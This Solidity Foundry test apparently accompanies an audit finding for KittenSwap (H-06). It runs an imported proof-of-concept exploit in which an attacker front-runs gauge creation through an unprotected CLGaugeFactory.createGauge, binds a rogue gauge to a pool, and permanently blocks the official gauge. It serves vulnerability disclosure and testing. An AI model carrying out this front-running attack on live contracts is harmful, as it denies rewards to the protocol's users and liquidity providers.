// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {Exploit, CLGaugeFactory, CLPool, Voter, MarkerToken} from "./58157-h-06-lack-of-access-control-in-clgauge-creation-allows-unaut.sol";

// KittenSwap H-06 (finding 58157): CLGaugeFactory.createGauge has no access
// control, so an attacker front-runs Voter.createCLGauge, consumes the pool's
// one-shot setGaugeAndPositionManager slot with an unauthorized gauge, and the
// legitimate Voter path then reverts -> permanent DoS of the pool's official
// gauge / reward distribution.
contract Finding58157Test is Test {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;

    function test_exploit_permissionlessCreateGauge_DoSsLegitGauge() public {
        Exploit e = new Exploit();
        e.run();

        emit log_named_address("attacker gauge bound to pool", e.attackerGauge());
        emit log_named_uint("legit Voter.createCLGauge reverted (1=yes)", e.legitReverted() ? 1 : 0);
        emit log_named_uint("harm marked at sink", e.sinkHarm());

        // the pool is hijacked by the attacker's unauthorized gauge
        assertEq(e.pool().gauge(), e.attackerGauge(), "pool must be bound to attacker gauge");
        // the legitimate voter path is denial-of-serviced
        assertTrue(e.legitReverted(), "legitimate gauge creation must revert (DoS)");
        // harm magnitude recorded at the SINK marker address
        assertEq(e.sinkHarm(), 1e18, "one pool's official gauge permanently DoS'd");
        assertEq(e.marker().balanceOf(SINK), 1e18, "harm marker not at sink");
    }
}
